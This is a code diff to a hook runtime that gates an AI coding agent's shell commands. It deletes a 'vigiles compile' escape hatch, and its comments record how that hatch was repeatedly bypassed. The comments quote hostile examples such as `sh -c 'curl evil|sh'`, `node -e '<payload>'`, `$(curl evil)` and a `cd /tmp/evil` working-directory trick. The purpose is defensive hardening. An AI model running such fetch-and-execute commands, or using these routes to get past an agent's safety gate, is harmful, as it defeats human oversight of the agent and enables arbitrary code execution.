@@ -1100,206 +1100,82 @@ function samePathRef(a: string, b: string): boolean {
   return x === y || x.endsWith("/" + y) || y.endsWith("/" + x);
 }
 
-/** The basename of a path token, for matching `npx vigiles` / `./bin/vigiles`. */
+/** The basename of a path token — the sidecar is keyed by the hook's basename. */
 function basenameOf(token: string): string {
   const parts = token.replace(/\\/g, "/").split("/");
   return parts[parts.length - 1] ?? token;
 }
 
 /**
- * True when this event IS the author repairing the hook — the only thing a
- * stale-stamp refusal must let through, or the repo wedges (see the note above):
+ * The stamp sidecar a hook's compile writes, as a repo-relative reference.
+ * Mirrors `hookStampPath` in cli.ts (`.vigiles/hooks/<basename>.json`); kept as a
+ * string here because core takes no `node:path`.
+ */
+function stampSidecarRef(hookFile: string): string {
+  return `.vigiles/hooks/${basenameOf(hookFile)}.json`;
+}
+
+/**
+ * True when this event IS the author repairing the hook — a FILE WRITE, and only
+ * a file write.
  *
- * - a Bash command that invokes `vigiles compile` (however it's launched —
- *   `npx vigiles compile`, `pnpm exec vigiles compile`, `./node_modules/.bin/vigiles compile`),
- *   which is what regenerates the stamp; or
- * - an edit/write whose target IS this hook's own source file, so a FILE gate
- *   over the repo can still be fixed by editing the hook again.
+ * 🔴 THIS USED TO ADMIT A BASH COMMAND, AND THAT WAS THE WHOLE PROBLEM. The
+ * escape accepted `vigiles compile …`, and recognising a trusted ACTION from an
+ * untrusted STRING produced five findings in a row, each fix correct and each
+ * followed by another: `.some()` over the leaves → the operand (`compile
+ * /tmp/payload.spec.ts`, which `loadSpec` imports) → the executable path
+ * (`/tmp/vigiles compile`) → the working directory (`cd /tmp/evil && vigiles
+ * compile`). The degrees of freedom in a command string are unbounded — argv,
+ * cwd, PATH, `node_modules` resolution, a hostile `.vigilesrc.json`, a shell
+ * function — so no amount of parsing closes the class. Two more constraints
+ * predict two more findings.
  *
- * AST-backed (`leafCommandsNormalized`), so it sees the invocation through a
- * compound command or a wrapper, exactly like every other matcher here.
+ * ## Why the command was not needed at all — measured, not argued
+ *
+ * MEASURED 2026-08-12 against the real runtime, on a stale-stamp fixture:
+ * writing `{}` into the stamp sidecar (or deleting it) makes
+ * `verifyStampOrRefuse` return early, so the hook LOADS AND ENFORCES again —
+ * `ls` passed and `git push --force` was still denied with the hook's own reason.
+ * The repo is unwedged by a file write, and the gate is back on duty; the author
+ * then runs `vigiles compile` through the NORMAL gate, needing no escape at all.
+ *
+ * MEASURED the same day on the load-wedge fixture: with `package.json` holding
+ * conflict markers, `vigiles compile <hook>` exits 1 —
+ * `Cannot load hook …: Invalid package config` — because compile has to load the
+ * hook through the same broken resolver the runtime just failed on. The command
+ * the escape existed to permit CANNOT repair that wedge. It was pure liability.
+ *
+ * So the Bash escape keeps only {@link isGitRecoveryLeaf} — commands that move
+ * the working tree back to something git already holds and execute no repo code
+ * — and the repair itself became what it always should have been: a write.
+ *
+ * ## What is accepted here
+ *
+ * A write whose target is the hook's own source, or its stamp sidecar
+ * (`.vigiles/hooks/<basename>.json`). Both are repo-owned paths derived from the
+ * file the runtime was invoked with, never from the event.
+ *
+ * `samePathRef` (suffix-tolerant) is right for a WRITE and would be wrong for an
+ * exec: the harness sends an absolute `file_path` while settings may carry a
+ * relative one, and the worst a loose match buys is the ability to write a file
+ * whose path ends the same way — no execution. That distinction is why the
+ * operand rule needed exact equality and this does not; with the exec path gone,
+ * so is the reason to be exact.
+ *
+ * This grants nothing new: a Bash gate never gated file tools in the first place
+ * (the 2026-08-10 incident was fixed by hand-editing JSON while every Bash
+ * command was refused), and a file gate already let the hook's own source be
+ * rewritten, which is strictly more powerful than clearing its stamp.
  */
 export function isStampRepairEvent(
   event: RawHookEvent,
   hookFile: string,
 ): boolean {
   const filePath = event.tool_input?.file_path;
-  if (typeof filePath === "string" && samePathRef(filePath, hookFile))
-    return true;
-  return allLeavesAre(event, (leaf) => isCompileLeaf(leaf, hookFile));
-}
-
-/**
- * A leaf that produces no effect of its own, so its presence never turns an
- * escape command into something else. `cd` only, and only `cd` — the lists below
- * are whitelists, and "looks harmless" is not a category.
- */
-function isNeutralLeaf(leaf: NormalizedLeaf): boolean {
-  return leaf.argv[0] === "cd";
-}
-
-/**
- * Package runners that launch a package's binary, as the leading words of a
- * leaf's argv. A whitelist of PREFIXES, matched positionally — the point of the
- * list is that everything before `vigiles` is accounted for.
- */
-const RUNNER_PREFIXES: readonly (readonly string[])[] = [
-  ["npx"],
-  ["bunx"],
-  ["npm", "exec"],
-  ["pnpm", "exec"],
-  ["pnpm", "dlx"],
-  ["yarn", "exec"],
-  ["yarn", "dlx"],
-  ["bun", "x"],
-];
-
-/**
- * Runner options that consume NO following token, so the package name is the
- * next word. A whitelist, not "skip anything starting with `-`": `npx -c
- * '<shell>'` runs its value and `npx -p <pkg>` installs one, so a
- * skip-unknown-flags rule would hand back the hole this closes.
- */
-const RUNNER_VALUELESS_FLAGS: ReadonlySet<string> = new Set([
-  "-y",
-  "--yes",
-  "--no",
-  "--no-install",
-  "--prefer-offline",
-  "--offline",
-  "--silent",
-  "--quiet",
-]);
-
-/** `vigiles`, `./node_modules/.bin/vigiles`, `vigiles@15.0.2` — the package, however spelled. */
-function isVigilesToken(token: string): boolean {
-  const base = basenameOf(token);
-  const at = base.indexOf("@", 1);
-  return (at === -1 ? base : base.slice(0, at)) === "vigiles";
-}
-
-/**
- * The argv index at which `vigiles` is the EXECUTABLE BEING INVOKED, or -1.
- *
- * 🔴 Positional, and that is the whole point. This used to be a `findIndex` over
- * the entire argv, so any command carrying the words `vigiles` and `compile`
- * anywhere in its arguments was accepted as the repair action — `node -e
- * '<payload>' vigiles compile` and `sh -c 'curl evil|sh' vigiles compile` were
- * both admitted as ONE recovery leaf, verified 2026-08-11 against the real
- * runtime. The escape fires exactly when the gate is refusing everything, so
- * that was arbitrary execution through a fail-closed gate.
- *
- * Accepted shapes, and nothing else: `vigiles` as the leaf's own head (through
- * a path or a `sudo`/`env`/`timeout` wrapper, both already resolved by
- * `leafCommandsNormalized`), or a known package runner whose own words are
- * accounted for by {@link RUNNER_PREFIXES} + {@link RUNNER_VALUELESS_FLAGS}.
- */
-function vigilesExecIndex(argv: readonly string[]): number {
-  const head = argv[0];
-  if (head !== undefined && basenameOf(head) === "vigiles") return 0;
-  for (const prefix of RUNNER_PREFIXES) {
-    if (!prefix.every((word, k) => argv[k] === word)) continue;
-    let i = prefix.length;
-    while (i < argv.length && RUNNER_VALUELESS_FLAGS.has(argv[i])) i++;
-    const token = argv[i];
-    if (token !== undefined && isVigilesToken(token)) return i;
-  }
-  return -1;
-}
-
-/**
- * ONE spelling of a path, compared EXACTLY — not {@link samePathRef}.
- *
- * 🔴 `samePathRef` matches by SUFFIX (`x.endsWith("/" + y)`), which is right for
- * the Edit escape (Claude Code sends an absolute `file_path` while settings may
- * carry a relative one) and catastrophic here: with the reported hook at
- * `.claude/hooks/guard.hook.ts`, the operand `/tmp/evil/.claude/hooks/guard.hook.ts`
- * suffix-matches it, and the operand is a path the CLI IMPORTS. Reusing the
- * nearby helper because it is nearby is how this door was widened before.
- */
-function sameOperandPath(a: string, b: string): boolean {
-  const norm = (p: string): string =>
-    p.replace(/\\/g, "/").replace(/^\.\//, "");
-  return norm(a) === norm(b);
-}
-
-/**
- * A leaf invoking `vigiles compile` — BARE, or naming the one file whose failure
- * is being repaired. Nothing else.
- *
- * 🔴 THIS DOOR HAS BEEN WRONG THREE TIMES, and the first two fixes each narrowed
- * the SHAPE without asking what the door is for. It matched the two words
- * anywhere in the argv (so `sh -c 'curl evil|sh' vigiles compile` walked
- * through); then it required `vigiles` to be the executable, and the ARGUMENT
- * became the payload — `vigiles compile /tmp/payload.spec.ts` was admitted while
- * the gate was down, and `compile` hands that operand to `loadSpec`, which
- * `await import()`s it and, failing that, shells out to
- * `npx tsx -e 'import("<operand>")'`. Arbitrary top-level code, executed by the
- * fail-closed gate's own escape hatch.
- *
- * ## What the operand rule is, and why it is sound
- *
- * The event may contribute AT MOST one token, and only by echoing a value the
- * REPO already chose:
- *
- *  - **no operand** — `vigiles compile` compiles what the repo DECLARES:
- *    `findSpecs()` globs the checkout and `discoverHookFiles(cwd)` reads
- *    `.vigiles/hooks/`. Nothing here comes from the event, so there is no
- *    attacker-chosen input at all. (This is the exact command this repo's own
- *    PostToolUse hook already runs.)
- *  - **exactly one operand, equal to `repairTarget`** — the file the runtime was
- *    invoked with (`vigiles hook-runtime run-program <file>`, wired from the
- *    compiled hooks block in settings). It is repo-owned config, not event data;
- *    the event can only re-supply the one path the repo already named, and any
- *    other path — including one merely INSIDE the checkout — is refused.
- *
- * "Inside the repo" would NOT have been sound: a checkout holds attacker-writable
- * paths in plenty of workflows (a PR branch, a fixture dir, `/tmp` symlinked in),
- * and `loadSpec` executes whatever it is pointed at. Equality with a single
- * repo-declared path is the property that closes it.
- *
- * The residual exposure, stated rather than glossed: whoever can WRITE that hook
- * source, or drop a `*.md.spec.ts` into the checkout, gets code executed. That is
- * true of the repo's ordinary `npm run build` and of the recompile hook that
- * already runs on every spec edit — and an attacker who can rewrite the hook
- * owns the gate outright. The escape must not AMPLIFY that reach, and with an
- * event-supplied path it did; with this rule it does not.
- *
- * ## The recovery path, so it is not rediscovered by trial and error
- *
- * A real person whose repo is wedged needs one command that works:
- *
- *  - stale stamp (you edited a `.hook.ts`) → run the command the refusal prints
- *    VERBATIM: `vigiles compile <that file>`. It is quoted from the same string
- *    this function compares against, so a copy-paste always matches.
- *  - hook sources under `.vigiles/hooks/` → bare `vigiles compile` also does it.
- *  - load failure (`package.json` left holding merge-conflict markers, so Node
- *    cannot resolve `vigiles/hook`) → `git merge --abort` / `git rebase --abort`
- *    / `git checkout -- <path>`; compiling cannot help, the loader is broken.
- *  - last resort, always available: Edit/Write do NOT go through the PreToolUse
- *    Bash gate, so the offending file can be fixed with a file tool and the
- *    session unblocks itself.
- *
- * A second operand, a flag, or any other path is refused — deliberately. If you
- * need to compile one unrelated spec while wedged, fix the wedge first.
- */
-function isCompileLeaf(leaf: NormalizedLeaf, repairTarget?: string): boolean {
-  const i = vigilesExecIndex(leaf.argv);
-  if (i === -1) return false;
-  // The verb is `args[0]` in the CLI's own dispatch — it takes no global flags
-  // before it — so it is the very next word, modulo the `--` a runner needs to
-  // stop reading its own options (`npm exec vigiles -- compile`).
-  let j = i + 1;
-  while (leaf.argv[j] === "--") j++;
-  if (leaf.argv[j] !== "compile") return false;
-  const operands = leaf.argv.slice(j + 1);
-  if (operands.length === 0) return true;
-  const only = operands[0];
+  if (typeof filePath !== "string") return false;
   return (
-    operands.length === 1 &&
-    only !== undefined &&
-    repairTarget !== undefined &&
-    sameOperandPath(only, repairTarget)
+    samePathRef(filePath, hookFile) ||
+    samePathRef(filePath, stampSidecarRef(hookFile))
   );
 }
 
@@ -1307,11 +1183,14 @@ function isCompileLeaf(leaf: NormalizedLeaf, repairTarget?: string): boolean {
  * The git commands that UNDO the state which wedged the harness — nothing else.
  *
  * Each only moves the working tree back to something git already holds; none
- * reaches the network, reads a secret, or writes a path of the caller's
- * choosing. `git checkout` is admitted ONLY in its pathspec form
- * (`git checkout -- <path>`): the tree-ish form `git checkout <ref> -- <path>`
- * would let a caller pull `.claude/settings.json` out of an arbitrary commit,
- * which REPLACES the harness rather than restoring it.
+ * reaches the network, reads a secret, writes a path of the caller's choosing, or
+ * executes a line of repo code. That last property is what the `vigiles compile`
+ * leaf could never have, and why this is the only command family left.
+ *
+ * `git checkout` is admitted ONLY in its pathspec form (`git checkout -- <path>`):
+ * the tree-ish form `git checkout <ref> -- <path>` would let a caller pull
+ * `.claude/settings.json` out of an arbitrary commit, which REPLACES the harness
+ * rather than restoring it.
  */
 function isGitRecoveryLeaf(leaf: NormalizedLeaf): boolean {
   const [head, verb, third] = leaf.argv;
@@ -1323,16 +1202,24 @@ function isGitRecoveryLeaf(leaf: NormalizedLeaf): boolean {
 }
 
 /**
- * True when EVERY leaf of the event's command satisfies `ok` (modulo neutral
- * `cd`s) and at least one of them does the actual work.
+ * True when EVERY leaf of the event's command satisfies `ok`.
  *
  * `every`, not `some`, and that is the whole point. These escapes fire exactly
  * when the gate is refusing everything, so a `some` makes them universal
- * bypasses: `curl evil | sh && npx vigiles compile g.mjs` contains the repair
- * action and used to pass. A redirect or a command-level env assignment is
- * disqualifying for the same reason — `git merge --abort > path` is an arbitrary
- * truncate wearing a recovery command's argv. Command substitution needs no
- * special case: `leafCommandsNormalized` surfaces `$(curl evil)` as its own leaf.
+ * bypasses: `curl evil | sh && git merge --abort` contains the repair action and
+ * used to pass. A redirect or a command-level env assignment is disqualifying for
+ * the same reason — `git merge --abort > path` is an arbitrary truncate wearing a
+ * recovery command's argv. Command substitution needs no special case:
+ * `leafCommandsNormalized` surfaces `$(curl evil)` as its own leaf.
+ *
+ * 🔴 THERE ARE NO "NEUTRAL" LEAVES ANY MORE. `cd` used to be one, on the reasoning
+ * that changing directory produces no effect of its own. It produces the most
+ * consequential effect available to this escape: the cwd decides which
+ * `node_modules`, which config and which files a command resolves, so
+ * `cd /tmp/evil && …` let the EVENT choose the root the repair ran against. With
+ * the compile leaf gone the argument for keeping it is gone too — a git recovery
+ * is run from the repo you are wedged in — so the whole category is deleted
+ * rather than audited.
  */
 function allLeavesAre(
   event: RawHookEvent,
@@ -1342,50 +1229,41 @@ function allLeavesAre(
   if (typeof command !== "string") return false;
   const leaves = leafCommandsNormalized(command);
   if (leaves.length === 0) return false; // unparseable → not an escape
-  let didWork = false;
   for (const leaf of leaves) {
     if (leaf.redirects.length > 0 || leaf.assigns.size > 0) return false;
-    if (ok(leaf)) didWork = true;
-    else if (!isNeutralLeaf(leaf)) return false;
+    if (!ok(leaf)) return false;
   }
-  return didWork;
+  return true;
 }
 
 /**
  * True when this event is a RECOVERY command — the narrow set that undoes a
  * state which took the hook runtime down with it.
  *
- * Observed 2026-08-10: a `package.json` left holding merge-conflict markers
- * stops Node resolving `vigiles/hook`, so NO compiled hook loads, so the
- * PreToolUse Bash gate refuses every command — `git merge --abort` included. The
- * cause was reachable only through the shell, and the shell was gated by the
- * failure. Same shape as the stale-stamp deadlock above, different input: this
- * time the broken file had nothing to do with any hook.
+ * Observed 2026-08-10: a `package.json` left holding merge-conflict markers stops
+ * Node resolving `vigiles/hook`, so NO compiled hook loads, so the PreToolUse
+ * Bash gate refuses every command — `git merge --abort` included. The cause was
+ * reachable only through the shell, and the shell was gated by the failure.
  *
- * `git merge --abort` · `git rebase --abort` · `git checkout -- <path>` ·
- * `vigiles compile`. Consulted ONLY when the program could not be LOADED — a
- * gate that DID load and answered `deny` is a verdict about the command, and
- * nothing here overrides it.
+ * `git merge --abort` · `git rebase --abort` · `git checkout -- <path>`.
+ * Consulted ONLY when the program could not be LOADED — a gate that DID load and
+ * answered `deny` is a verdict about the command, and nothing here overrides it.
+ *
+ * 🔴 `vigiles compile` IS NOT HERE, and its absence is measured rather than
+ * assumed: during exactly this wedge it exits 1 with
+ * `Cannot load hook …: Invalid package config`, because it loads the hook through
+ * the same resolver that just failed. It could never repair this state, and it
+ * was the only member of the set that executed repo code — the one every finding
+ * on this door was about. See {@link isStampRepairEvent} for the stamp wedge,
+ * whose repair is now a file write.
  *
  * Why this is not a hole: while the runtime cannot load, the gate enforces
  * NOTHING — it refuses every call — so breaking the load path buys an attacker a
  * denial of service, not a bypass. What they must not buy is the ability to run
- * something of their choosing, and this list holds no command that reads a file,
- * writes a path they name, or reaches the network. {@link allLeavesAre} is why
- * composition cannot smuggle one in.
+ * something of their choosing, and every command here only moves the tree back to
+ * a state git already holds. {@link allLeavesAre} is why composition cannot
+ * smuggle one in.
  */
-export function isRecoveryEvent(
-  event: RawHookEvent,
-  /**
-   * The hook file the runtime was invoked with — the ONLY path a
-   * `vigiles compile <operand>` may name. Omitted, no operand is accepted at
-   * all: a caller that cannot say which file is being repaired must not be able
-   * to hand `compile` a path, so this fails CLOSED by default.
-   */
-  hookFile?: string,
-): boolean {
-  return allLeavesAre(
-    event,
-    (leaf) => isGitRecoveryLeaf(leaf) || isCompileLeaf(leaf, hookFile),
-  );
+export function isRecoveryEvent(event: RawHookEvent): boolean {
+  return allLeavesAre(event, isGitRecoveryLeaf);
 }
